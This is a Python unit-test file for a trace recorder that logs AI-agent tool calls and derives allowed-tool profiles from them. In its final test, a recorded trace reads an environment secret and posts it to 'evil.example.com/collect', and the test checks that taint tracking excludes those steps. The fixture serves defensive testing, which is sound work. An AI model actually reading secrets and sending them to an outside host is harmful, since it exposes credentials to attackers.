"""
test_recorder.py – unit tests for the TraceRecorder (Stage 1 – Observe).

Verifies that:
- Steps are recorded with the correct fields.
- step_id values are auto-assigned sequentially.
- depends_on and metadata are stored correctly.
- to_dict() output matches the trace fixture schema.
- save() writes valid JSON that round-trips through json.load.
- The recorder is independent of the pipeline; it never calls tools itself.
"""

from __future__ import annotations

import json
from pathlib import Path

import pytest

from awc.observe.recorder import TraceRecorder


# ------------------------------------------------------------------ #
# Basic recording                                                      #
# ------------------------------------------------------------------ #


class TestRecord:
    def test_single_step_assigned_step_001(self) -> None:
        rec = TraceRecorder(workflow="test")
        step_id = rec.record(
            tool="fs_read",
            action="read",
            resource="repo://local/main.py",
            input_sources=["repo_local"],
        )
        assert step_id == "step-001"

    def test_sequential_step_ids(self) -> None:
        rec = TraceRecorder(workflow="test")
        ids = [
            rec.record(tool=f"tool_{i}", action="read",
                       resource=f"repo://local/f{i}.py",
                       input_sources=["repo_local"])
            for i in range(3)
        ]
        assert ids == ["step-001", "step-002", "step-003"]

    def test_step_fields_stored_correctly(self) -> None:
        rec = TraceRecorder(workflow="test")
        rec.record(
            tool="git_commit",
            action="write",
            resource="repo://local/commits",
            input_sources=["repo_local"],
            depends_on=["step-001"],
            metadata={"message": "chore: update"},
        )
        step = rec.steps()[0]
        assert step["tool"] == "git_commit"
        assert step["action"] == "write"
        assert step["resource"] == "repo://local/commits"
        assert step["input_sources"] == ["repo_local"]
        assert step["depends_on"] == ["step-001"]
        assert step["metadata"] == {"message": "chore: update"}

    def test_depends_on_defaults_to_empty_list(self) -> None:
        rec = TraceRecorder(workflow="test")
        rec.record(tool="fs_read", action="read",
                   resource="repo://local/f.py", input_sources=["repo_local"])
        assert rec.steps()[0]["depends_on"] == []

    def test_metadata_omitted_when_not_provided(self) -> None:
        rec = TraceRecorder(workflow="test")
        rec.record(tool="fs_read", action="read",
                   resource="repo://local/f.py", input_sources=["repo_local"])
        assert "metadata" not in rec.steps()[0]

    def test_multiple_input_sources_stored(self) -> None:
        rec = TraceRecorder(workflow="test")
        rec.record(tool="shell_exec", action="exec",
                   resource="shell://local",
                   input_sources=["repo_local", "tool_output"])
        assert rec.steps()[0]["input_sources"] == ["repo_local", "tool_output"]

    def test_len_tracks_step_count(self) -> None:
        rec = TraceRecorder(workflow="test")
        assert len(rec) == 0
        rec.record(tool="t", action="a", resource="r://x", input_sources=["repo_local"])
        assert len(rec) == 1
        rec.record(tool="t2", action="a", resource="r://y", input_sources=["repo_local"])
        assert len(rec) == 2


# ------------------------------------------------------------------ #
# to_dict – schema conformance                                        #
# ------------------------------------------------------------------ #


class TestToDict:
    def test_top_level_keys_present(self) -> None:
        rec = TraceRecorder(workflow="repo_maintenance", description="test run")
        rec.record(tool="fs_read", action="read",
                   resource="repo://local/f.py", input_sources=["repo_local"])
        d = rec.to_dict()
        for key in ("trace_id", "workflow", "description", "recorded_at", "steps"):
            assert key in d, f"Missing key: {key}"

    def test_workflow_and_description_stored(self) -> None:
        rec = TraceRecorder(workflow="my_flow", description="a description")
        d = rec.to_dict()
        assert d["workflow"] == "my_flow"
        assert d["description"] == "a description"

    def test_explicit_trace_id_preserved(self) -> None:
        rec = TraceRecorder(workflow="test", trace_id="trace-explicit-001")
        assert rec.to_dict()["trace_id"] == "trace-explicit-001"

    def test_auto_trace_id_is_string(self) -> None:
        rec = TraceRecorder(workflow="test")
        assert isinstance(rec.to_dict()["trace_id"], str)

    def test_steps_list_matches_recorded(self) -> None:
        rec = TraceRecorder(workflow="test")
        rec.record(tool="git_add", action="write",
                   resource="repo://local/staging", input_sources=["repo_local"])
        rec.record(tool="git_commit", action="write",
                   resource="repo://local/commits",
                   input_sources=["repo_local"], depends_on=["step-001"])
        steps = rec.to_dict()["steps"]
        assert len(steps) == 2
        assert steps[1]["depends_on"] == ["step-001"]

    def test_to_dict_returns_copy(self) -> None:
        """Mutating the returned dict must not affect the recorder's internal state."""
        rec = TraceRecorder(workflow="test")
        rec.record(tool="fs_read", action="read",
                   resource="repo://local/f.py", input_sources=["repo_local"])
        d = rec.to_dict()
        d["steps"].clear()
        assert len(rec) == 1  # internal state unchanged


# ------------------------------------------------------------------ #
# save – file I/O                                                     #
# ------------------------------------------------------------------ #


class TestSave:
    def test_save_writes_valid_json(self, tmp_path: Path) -> None:
        rec = TraceRecorder(workflow="test", trace_id="trace-save-001")
        rec.record(tool="fs_read", action="read",
                   resource="repo://local/f.py", input_sources=["repo_local"])
        out = rec.save(tmp_path / "trace.json")
        assert out.exists()
        with out.open() as fh:
            loaded = json.load(fh)
        assert loaded["trace_id"] == "trace-save-001"
        assert len(loaded["steps"]) == 1

    def test_save_creates_parent_dirs(self, tmp_path: Path) -> None:
        rec = TraceRecorder(workflow="test")
        rec.record(tool="fs_read", action="read",
                   resource="repo://local/f.py", input_sources=["repo_local"])
        dest = tmp_path / "nested" / "dir" / "trace.json"
        rec.save(dest)
        assert dest.exists()

    def test_save_returns_path(self, tmp_path: Path) -> None:
        rec = TraceRecorder(workflow="test")
        rec.record(tool="fs_read", action="read",
                   resource="repo://local/f.py", input_sources=["repo_local"])
        result = rec.save(tmp_path / "t.json")
        assert isinstance(result, Path)

    def test_saved_trace_round_trips_through_profiler(self, tmp_path: Path) -> None:
        """A trace saved by the recorder can be loaded by derive_profile."""
        from awc.compiler.profiler import derive_profile

        rec = TraceRecorder(workflow="round_trip", trace_id="trace-rt-001")
        rec.record(tool="fs_read", action="read",
                   resource="repo://local/src/main.py", input_sources=["repo_local"])
        rec.record(tool="git_commit", action="write",
                   resource="repo://local/commits",
                   input_sources=["repo_local"], depends_on=["step-001"])
        path = rec.save(tmp_path / "rt.json")

        profile = derive_profile([path], profile_id="rt_profile")
        assert "fs_read" in profile.allowed_tools
        assert "git_commit" in profile.allowed_tools
        assert profile.tainted_steps_observed == 0

    def test_tainted_steps_excluded_from_profile_after_save(self, tmp_path: Path) -> None:
        """Untrusted input_sources in a recorded trace → tainted → excluded from profile."""
        from awc.compiler.profiler import derive_profile

        rec = TraceRecorder(workflow="taint_test")
        rec.record(tool="env_read", action="read",
                   resource="env://SECRET", input_sources=["environment"])
        rec.record(tool="http_post", action="network_call",
                   resource="external://evil.example.com/collect",
                   input_sources=["environment"], depends_on=["step-001"])
        path = rec.save(tmp_path / "tainted.json")

        profile = derive_profile([path], profile_id="taint_profile")
        assert len(profile.allowed_tools) == 0
        assert profile.tainted_steps_observed == 2
